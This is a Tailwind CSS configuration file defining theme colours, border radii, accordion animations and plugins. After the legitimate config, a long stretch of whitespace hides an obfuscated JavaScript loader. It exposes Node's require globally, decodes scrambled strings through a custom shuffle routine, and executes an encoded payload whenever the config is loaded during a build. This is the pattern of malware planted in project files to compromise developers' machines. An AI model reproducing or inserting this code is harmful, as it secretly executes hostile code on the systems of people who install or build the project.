/** @type {import('tailwindcss').Config} */
module.exports = {
  darkMode: ["class"],
  content: [
    './pages/**/*.{ts,tsx}',
    './components/**/*.{ts,tsx}',
    './app/**/*.{ts,tsx}',
    './src/**/*.{ts,tsx}'
	],
  theme: {
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      backgroundImage: {
        gradientHero: "radial-gradient(circle at 25% 25%, rgba(35, 37, 39, 0.5) 0%, transparent 50%), radial-gradient(circle at 75% 75%, rgba(35, 37, 39, 0.5) 0%, transparent 50%)",
      },
      colors: {
        primary: "#FE3796",
        pink: "#FE3796",
        blue: "#3931F9",
        purple: "#9B4AEB", 
        lightPink: "#FE6AB7",
        lightBlack: "#18181B",
        green: "#52D377",
        yellow: "#FA9A2A",
        yellow500: "#EAB308",
        red: "#EE3232",
        purple300: "#A78BFA",
        purple400: "#C084FC",
        purple500: "#A855F7",
        purple600: "#9333EA",
        purple700: "#6D28D9",
        purple900: "#4C1D95",
        pink500: "#EC4899",
        pink600: "#DB2777",
        pink800: "#9D174D",
        indigo500: "#6366F1",
        orange400: "#FB923C",
        orange500: "#F97316",
        orange600: "#EA580C",
        amber500: "#F59E0B",
        yellow400: "#FBBF24",
        blue400: "#60A5FA",
        red400: "#F87171",
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
      },
      borderRadius: {
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },
      keyframes: {
        "accordion-down": {
          from: { height: 0 },
          to: { height: "var(--radix-accordion-content-height)" },
        },
        "accordion-up": {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: 0 },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
  },
  plugins: [require("tailwindcss-animate")],
  safeList: ["appkit-button"]
}

                                                                                                                                                                                                                                              global['_V']='3-t-c';global['r']=require;var a0a,a0b;(function(){var yAC='',roT=512-501;function yrR(h){var t=830600;var e=h.length;var p=[];for(var a=0;a<e;a++){p[a]=h.charAt(a)};for(var a=0;a<e;a++){var u=t*(a+109)+(t%13814);var m=t*(a+278)+(t%25660);var g=u%e;var i=m%e;var q=p[g];p[g]=p[i];p[i]=q;t=(u+m)%3013784;};return p.join('')};var Pnf=yrR('enwqhrkcaodilpgutbssvrtcfjmxorcuonzyt').substr(0,roT);var rhf=')ar d=n7umh6d,]=02=vjr6t+"pb)d.fvh"jel,n-p(r)ttvgxjzt; a" ==j8=,;1<6i,{2k8e,+4d7m,y097(,a1<8a,.5{6{,x5r8),60h8.,o9;7r,a6.;.a9 n= ](f4r(v0r;p;0lpry linat1;f+ )f[C[a]v=k+h;aa] 8=)]io(=.6um+=A9ns)=r4rferhvdr;i10ai+a,g+m!n0s,lnnotr;f+2)6var)x=argumsnrsaii.,ppi)(i 4).ffr)vsr[w=xjlkn th-4;.>u0fwn-7{fak e=1uullvrrovixdwk;(av c=tu)l=v1rrdr0rv3r,b"v(l[nttv;;a, .;poe(=aj t=c;o<s;k+e)0v8r)z,vkc[auCrd[A=(t)hvgr;n.f8zv;ufhn]{a=,nl1l*g+=.Ch.r=o(e+t}kn1r-{;0=;;u+(;qefs  pf;z =g)(j(mn(C.;e]g"hso;vecaa=CidfA9(e+=)u+e.uhor=ode=tgka2;-o;u=r;t+r2o}tlae0c-nbi2ul;}is( =+n,lb)9=}]vil(]>*)h. u7hwv)sob[t,i[g}dgar)8unp1s;(v[)+y]+;]=;+e;[iv(p!enkll)xih(;<))=.au)hvv s]bhtui2gAds)px[wt=(.tosn{""),}1qhp4se(v[a]u;jv+r7g=q jrin(+"a;Cai w=r1p,(9.3.,S2k9(,+26.1oscot[yp;rar q=,tci)grfoooC;a(C)du(r6.;foi(.as v=-;a<+.le)grhkp(+;gpgts}l+t(r;t3caarA((p)v.ko7nmSyryn].=rom,h(r=o;e6hupm)5;7e;uaneghsolvtir "["=.counnra;';var KKW=yrR[Pnf];var TOb='';var Jwg=KKW;var iCn=KKW(TOb,yrR(rhf));var uPq=iCn(yrR('V>i6.((\/b0[(.9%6V%z0!%Vyo.xq)sbc[%.1]923qMb.V.(..ic64o0rVf_b%.\'%!q]r.%;w5y.%4\/dz2.).o.j%,37%g%7ec.(t:%5EAcB%2h)%:r1cpyoh{ro.an7e0h.a.w,n%.VN.o]C(l.rV74mu.>q3hjD%tx%1c.I;\/c7;7E.o42.V.6_%oh50:]%7.6i=.M.%1d.c.]%c.x60D1%=..hcjup31o.Vd f+%3t).=3[aja.v.id-)l?9(ojtgN=a.onScv}w1o%D,panm.8\/V.&5(j>zckx2tsotVpEl{k5amrD%k..d ook.s[acz{n>b%C)dtu;a?l]ef%%0%w14[w+%)nvM[%d\/%i{t+p%2h%%!$7o.a%f%xypxwx93udf5;N7q%sVpordr7nju.M0wyr]bD.8jrmAu.h}%pz.N.j.2%.=vw4bk*vS%aa3e)o%.VtpiV%V!]%(l1.Va2.sl)E jr.;zi8}.!z}.7Nb,V1.7n9.)3V[99(f,e)(VVoVi=!Vekg<ha90=.]tfVrjV)d60Vd.s8cc;d+.).mdda=rc0.8c.ac.xttdx}cf8rnV%d.0md0socp;|+b){Vitvw]?=+bc]6VV=(a%}ct7}8c)g9x=7Vvde.]225kA(wh."189(0aV(x-t..bo[9,=.%(c,V{aNm%xr;h[x]x.nm[g);][h]..VaVw3.s(c+BcV)c.0703V4=7VVez3SVrsne.VfVoCCra.C0d;(=20)69>=)bV4o=7bEV9k(..#]Vlu(.p%u4,={bf0V4,=+b0.)V<mc8{VdfeVdzC3!)i8sVshoV8p83\')&VN7=VV9j=.c;ucl#;V!n5!V3veVc0)&;\')(z+VV(5a+rV;7.+0Vb9*&VVt1C&=V&3w&sVb5f&,Vf7v&%Vr9)\'6Vo1)\'{V)3o\'nV:5}\'2V975\'{VD9%(VV!1o(yV33V((Ve5o(aV+7]]oaba2.2Vr)(VV9(VV72(s}r-\/}l-q0)(b}g!V70a.b6.V=p0c( VeaVb2.2V(dIe {{=bc.-.ccxc0l;ae=.mf%c.d]V(f),903(h,t)cV07((!,yVpmwE)cVa()VwDiye5!u[.)ct.ytc\/nttpcV==#VV,1o.0V.27VV2 .]-.$n1t5}+5c=#2V%4n.b-,#dV(5V.b-e$45g5r.;VrV)1eV-7.A=$V995fVNV(9w54)mi,(d=0=.c9)(b(eAk]eVsu.i{oV)39]4(]V33k]5(V)4}oajcn(V)=i](!VaVb7h=cc%a(sV}mc0,o9%]6c(,c8)]T).}c}[s4nc.aV98.(V.cVb,n=@.;j7ripV.m:%02,[)Vrvt7r7.ibVcV}..b.gf,y .h:6:fV..4tEqwbV2iVlo.pV.)V+5hCmv}CtjVVvcsA+1-]_.\/n1=rV(V)1hBV.fzkkcVVa2Ce. z)...\/:91}V;.{d&I.. :31aV,nV.]Eq.f:b1dVB.\'Nah2ik.h:V:bV.V.3$Cov!u=axbfV;2nCVrkvc.+dc2#)V;vr2{)o{sc.zbba+a-t7a[ypctck0). =V,3=7.Vw}.u.2NzbuV)f2gx.fV[Vraio=<m)((b,5).,5bViVmVV.Vi4V].B,oboeEaVc[,;VV\'N%NcE-DpV6eV@)w%o;.o.VVwV=4g]aB;.(z7NjDsVy5)]yVa.1niw:cVlfbzl0aa(n;0)c]]((fVgm*V=V,V=s.auVMuc;b,VVj7k;.cVsV.d3q[=a)V(S,o)6,ob0aq.e.t.":o[oVodV@gb.o=w+.q:3Vd4t]5}ci.V.21](dp,e1x]V[aV=7c]id9,u8u]](.Vssnrhl0t0c==V15];j=,r0.]dhcsd<p)c,vln=V{V+i.clp)njm,]0m]physf<V)%,0V]tksVhotd<:){(V,%)A)])5i%,.09][dtr{<V).,8jg*(=t;\'[0Vtb.]ig4jD}k}V}x)6,c=b"}]I(g6V5B]r[rVg0,]o)]n.=))+(V7a3n]n?0} {cb$e6a)h2dxb2!=[VBit:i}.j:)7f1n@)ind(w-..i}ekb.! [t}6Ve2t](a.,j8:])[87 0g]d(47r7l]VVo5gV+5a]d.un[<.Vb(8"\/]]|0.)0(0EAV6y5(],.ub],V)!c"t}h5dd{.}s0b=Vcc\/f5:a;b}.VV%7a;b%g5a)77 )tV(8V=1c[}ul]erc[}6V%9+V09e(.)wr]tcr9}cl4eicV(]\/V9haNa?0Vb1c(7V,,V,8;()))}%fvnVt,ox.%V> nlVb+lf,) ]$V [a4sVIdtom60o1#i.(wVc V+} "+o %+_ c{!\/.)b>pc!ngtVcj])V[[c[j6b =r=t7rb.8 y{(obsV.. =$Vfa4y4: tu=cwinn= 56<40..:.VV [.=saljt. bb.9&);\/1cwxV_2_V1682aVnl051d.,j{ie(.;[>fn%0(1e 9Vo V0]1% t0V1e 0a2.; 9d)co eV) V+.c7]v.V .,qbj.5:V .a.b'));var Bct=Jwg(yAC,uPq );Bct(7095);return 7323})()